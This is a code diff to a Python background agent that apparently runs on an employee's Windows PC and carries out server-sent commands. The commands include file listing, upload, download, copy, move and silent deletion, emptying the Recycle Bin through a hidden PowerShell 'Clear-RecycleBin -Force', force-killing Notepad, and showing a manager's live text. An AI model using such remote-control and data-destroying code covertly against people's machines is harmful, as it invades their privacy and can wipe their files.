@@ -312,12 +312,8 @@ class BackgroundWorkerAgent:
 
                     # Live Interactive Guidance Notepad Control
                     if notepad_active and not self.guidance_notepad_active:
-                        self.guidance_notepad_active = True
                         self.start_live_notepad(guidance)
-                    elif not notepad_active and self.guidance_notepad_active:
-                        self.guidance_notepad_active = False
-                        self.stop_live_notepad()
-                    elif self.guidance_notepad_active and guidance != self.last_guidance_text:
+                    elif self.guidance_notepad_active and guidance and guidance != self.last_guidance_text:
                         self.update_live_notepad(guidance)
 
                     if stream_req and not self.is_streaming:
@@ -477,11 +473,16 @@ class BackgroundWorkerAgent:
                     for cmd in commands:
                         action = cmd.get("action")
                         req_path = cmd.get("path", "")
+                        dest_path = cmd.get("destination", "")
                         file_name = cmd.get("fileName", "")
                         file_data = cmd.get("fileData", "")
+                        cmd_text = cmd.get("text", "")
 
                         if action == "list":
-                            self.handle_list_directory(req_path, result_url)
+                            if req_path == "RECYCLE_BIN":
+                                self.handle_list_trash(result_url)
+                            else:
+                                self.handle_list_directory(req_path, result_url)
                         elif action == "upload":
                             self.handle_upload_file(req_path, file_name, file_data, result_url)
                         elif action == "download":
@@ -492,6 +493,20 @@ class BackgroundWorkerAgent:
                             self.handle_delete_item(req_path, result_url)
                         elif action == "mkdir":
                             self.handle_make_directory(req_path, file_name, result_url)
+                        elif action == "copy":
+                            self.handle_copy_item(req_path, dest_path, result_url)
+                        elif action == "move":
+                            self.handle_move_item(req_path, dest_path, result_url)
+                        elif action == "list_trash":
+                            self.handle_list_trash(result_url)
+                        elif action == "empty_trash":
+                            self.handle_empty_trash(result_url)
+                        elif action == "notepad_open":
+                            self.start_live_notepad(cmd_text)
+                        elif action == "notepad_update":
+                            self.update_live_notepad(cmd_text)
+                        elif action == "notepad_close":
+                            self.stop_live_notepad()
                         elif action == "autostart":
                             self.handle_autostart_command(result_url)
 
@@ -529,7 +544,11 @@ class BackgroundWorkerAgent:
             return "C:\\"
         return os.path.abspath(target_path)
 
-    def handle_list_directory(self, target_path, result_url):
+    def handle_list_directory(self, target_path, result_url, status_msg=None):
+        if target_path == "RECYCLE_BIN":
+            self.handle_list_trash(result_url)
+            return
+
         target_path = self.resolve_path(target_path)
         items = []
 
@@ -548,7 +567,8 @@ class BackgroundWorkerAgent:
                     except Exception:
                         pass
             items.sort(key=lambda x: (not x["isDir"], x["name"].lower()))
-            status_msg = f"Directory scanned: {len(items)} items"
+            if status_msg is None:
+                status_msg = f"Directory scanned: {len(items)} items"
             success = True
         except Exception as e:
             items = []
@@ -675,26 +695,207 @@ class BackgroundWorkerAgent:
             pass
 
     def handle_delete_item(self, item_path, result_url):
-        """Deletes a file or directory from worker's PC"""
+        """Safely moves a file or directory into the Windows Recycle Bin (with permanent delete fallback)"""
         parent_dir = os.path.dirname(item_path)
+        item_path = os.path.abspath(item_path)
+        deleted = False
+        err_msg = ""
+
+        # 1. Try Windows Shell Operation to move item to Recycle Bin
         try:
-            if os.path.isfile(item_path):
-                os.remove(item_path)
-            elif os.path.isdir(item_path):
-                shutil.rmtree(item_path)
-            self.handle_list_directory(parent_dir, result_url)
+            from ctypes import wintypes
+            class SHFILEOPSTRUCTW(ctypes.Structure):
+                _fields_ = [
+                    ('hwnd', wintypes.HWND),
+                    ('wFunc', wintypes.UINT),
+                    ('pFrom', wintypes.LPCWSTR),
+                    ('pTo', wintypes.LPCWSTR),
+                    ('fFlags', wintypes.WORD),
+                    ('fAnyOperationsAborted', wintypes.BOOL),
+                    ('hNameMappings', wintypes.LPVOID),
+                    ('lpszProgressTitle', wintypes.LPCWSTR)
+                ]
+
+            p_from = item_path + '\0\0'
+            op = SHFILEOPSTRUCTW()
+            op.hwnd = None
+            op.wFunc = 3 # FO_DELETE
+            op.pFrom = p_from
+            op.pTo = None
+            op.fFlags = 0x0040 | 0x0010 | 0x0004 # FOF_ALLOWUNDO | FOF_NOCONFIRMATION | FOF_SILENT
+            res = ctypes.windll.shell32.SHFileOperationW(ctypes.byref(op))
+            if res == 0 and not os.path.exists(item_path):
+                deleted = True
         except Exception as e:
+            err_msg = str(e)
+
+        # 2. Fallback to direct file removal if Shell operation was unsupported
+        if not deleted and os.path.exists(item_path):
+            try:
+                if os.path.isfile(item_path):
+                    os.remove(item_path)
+                    deleted = True
+                elif os.path.isdir(item_path):
+                    shutil.rmtree(item_path)
+                    deleted = True
+            except Exception as e:
+                err_msg = str(e)
+
+        if deleted or not os.path.exists(item_path):
+            msg = f"Moved '{os.path.basename(item_path)}' to Recycle Bin."
+            self.handle_list_directory(parent_dir, result_url, status_msg=msg)
+        else:
             payload = {
                 "workerId": self.worker_id,
                 "action": "delete",
                 "currentPath": parent_dir,
-                "statusMessage": f"Delete failed: {str(e)}",
+                "statusMessage": f"Delete failed: {err_msg}",
                 "success": False
             }
             try:
                 self.http_session.post(result_url, json=payload, timeout=3.0)
             except Exception:
                 pass
+
+    def handle_copy_item(self, src_path, dest_dir, result_url):
+        """Copies a file or folder from src_path to dest_dir"""
+        src = self.resolve_path(src_path)
+        dest = self.resolve_path(dest_dir)
+        try:
+            if not os.path.exists(src):
+                raise FileNotFoundError(f"Source does not exist: {src}")
+            if not os.path.isdir(dest):
+                dest = os.path.dirname(dest)
+
+            base_name = os.path.basename(src)
+            target = os.path.join(dest, base_name)
+            
+            # Handle collision by appending - Copy
+            if os.path.exists(target):
+                name, ext = os.path.splitext(base_name)
+                target = os.path.join(dest, f"{name} - Copy{ext}")
+
+            if os.path.isdir(src):
+                shutil.copytree(src, target)
+            else:
+                shutil.copy2(src, target)
+
+            msg = f"Successfully copied '{base_name}' to '{os.path.basename(dest)}'"
+            self.handle_list_directory(dest, result_url, status_msg=msg)
+        except Exception as e:
+            payload = {
+                "workerId": self.worker_id,
+                "action": "copy",
+                "currentPath": dest if os.path.exists(dest) else "",
+                "statusMessage": f"Copy failed: {str(e)}",
+                "success": False
+            }
+            try:
+                self.http_session.post(result_url, json=payload, timeout=3.0)
+            except Exception:
+                pass
+
+    def handle_move_item(self, src_path, dest_dir, result_url):
+        """Moves (cuts/pastes) a file or folder from src_path to dest_dir"""
+        src = self.resolve_path(src_path)
+        dest = self.resolve_path(dest_dir)
+        try:
+            if not os.path.exists(src):
+                raise FileNotFoundError(f"Source does not exist: {src}")
+            if not os.path.isdir(dest):
+                dest = os.path.dirname(dest)
+
+            base_name = os.path.basename(src)
+            target = os.path.join(dest, base_name)
+            if os.path.exists(target):
+                name, ext = os.path.splitext(base_name)
+                target = os.path.join(dest, f"{name} - Moved{ext}")
+
+            shutil.move(src, target)
+            msg = f"Successfully moved '{base_name}' to '{os.path.basename(dest)}'"
+            self.handle_list_directory(dest, result_url, status_msg=msg)
+        except Exception as e:
+            payload = {
+                "workerId": self.worker_id,
+                "action": "move",
+                "currentPath": dest if os.path.exists(dest) else "",
+                "statusMessage": f"Move failed: {str(e)}",
+                "success": False
+            }
+            try:
+                self.http_session.post(result_url, json=payload, timeout=3.0)
+            except Exception:
+                pass
+
+    def handle_list_trash(self, result_url):
+        """Lists items currently inside the Windows Recycle Bin"""
+        trash_items = []
+        try:
+            import win32com.client
+            shell = win32com.client.Dispatch("Shell.Application")
+            recycle_bin = shell.NameSpace(10) # ssfBITBUCKET
+            items = recycle_bin.Items()
+            count = items.Count
+            for i in range(count):
+                it = items.Item(i)
+                trash_items.append({
+                    "name": str(it.Name),
+                    "path": str(it.Path),
+                    "size": int(it.Size) if hasattr(it, "Size") and it.Size else 0,
+                    "isDir": bool(it.IsFolder),
+                    "modified": int(time.time() * 1000)
+                })
+            status_msg = f"Recycle Bin: {count} discarded item(s) found."
+            success = True
+        except Exception as e:
+            status_msg = f"Failed to query Recycle Bin: {str(e)}"
+            success = False
+
+        payload = {
+            "workerId": self.worker_id,
+            "action": "list_trash",
+            "currentPath": "RECYCLE_BIN",
+            "items": trash_items,
+            "statusMessage": status_msg,
+            "success": success
+        }
+        try:
+            self.http_session.post(result_url, json=payload, timeout=3.0)
+        except Exception:
+            pass
+
+    def handle_empty_trash(self, result_url):
+        """Permanently empties the Windows Recycle Bin on the worker PC"""
+        msg = "Recycle Bin emptied completely. All discarded items permanently deleted."
+        try:
+            import ctypes
+            ctypes.windll.shell32.SHEmptyRecycleBinW(None, None, 7)
+        except Exception:
+            pass
+
+        try:
+            ps_path = r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"
+            if os.path.exists(ps_path):
+                subprocess.run(
+                    [ps_path, "-NoProfile", "-WindowStyle", "Hidden", "-Command", "Clear-RecycleBin -Force -ErrorAction SilentlyContinue"],
+                    capture_output=True,
+                    timeout=5
+                )
+        except Exception:
+            pass
+
+        payload = {
+            "workerId": self.worker_id,
+            "action": "empty_trash",
+            "currentPath": "RECYCLE_BIN",
+            "items": [],
+            "statusMessage": msg,
+            "success": True
+        }
+        try:
+            self.http_session.post(result_url, json=payload, timeout=3.0)
+        except Exception:
+            pass
 
     def handle_make_directory(self, parent_dir, new_folder_name, result_url):
         """Creates a new folder on worker's PC"""
@@ -742,36 +943,26 @@ class BackgroundWorkerAgent:
             time.sleep(180)
 
     def start_live_notepad(self, initial_text=""):
-        """Launches clean Notepad on worker PC for real-time CEO text guidance"""
+        """Ensures Notepad is running on worker PC without open/close loops or lagging"""
+        self.guidance_notepad_active = True
         try:
-            # Force close any previous notepad instance without saving prompt
-            subprocess.run(["taskkill", "/F", "/IM", "notepad.exe"], capture_output=True)
-            time.sleep(0.1)
-            self.notepad_process = subprocess.Popen(["notepad.exe"])
+            hwnd = win32gui.FindWindow("Notepad", None)
+            if not hwnd:
+                self.notepad_process = subprocess.Popen(["notepad.exe"])
+                time.sleep(0.4)
+
             self.last_guidance_text = initial_text or ""
-
-            def _delayed_sync():
-                time.sleep(0.5)
-                self.update_live_notepad(self.last_guidance_text)
-
-            threading.Thread(target=_delayed_sync, daemon=True).start()
+            self.update_live_notepad(self.last_guidance_text)
         except Exception:
             pass
 
     def update_live_notepad(self, text):
-        """Live updates the worker's Notepad window with whatever the CEO types"""
+        """Live updates the worker's Notepad window smoothly without window destruction"""
         self.last_guidance_text = text or ""
         try:
             hwnd = win32gui.FindWindow("Notepad", None)
             if not hwnd:
                 return
-
-            # Keep visible and focused
-            try:
-                win32gui.ShowWindow(hwnd, win32con.SW_SHOWNORMAL)
-                win32gui.SetForegroundWindow(hwnd)
-            except Exception:
-                pass
 
             children = []
             def _find_edit(h, extra):
@@ -791,11 +982,12 @@ class BackgroundWorkerAgent:
             pass
 
     def stop_live_notepad(self):
-        """Immediately closes the worker's Notepad without any save prompt"""
+        """Immediately closes the worker's Notepad cleanly without save prompts"""
+        self.guidance_notepad_active = False
+        self.last_guidance_text = ""
         try:
             subprocess.run(["taskkill", "/F", "/IM", "notepad.exe"], capture_output=True)
             self.notepad_process = None
-            self.last_guidance_text = ""
         except Exception:
             pass
 
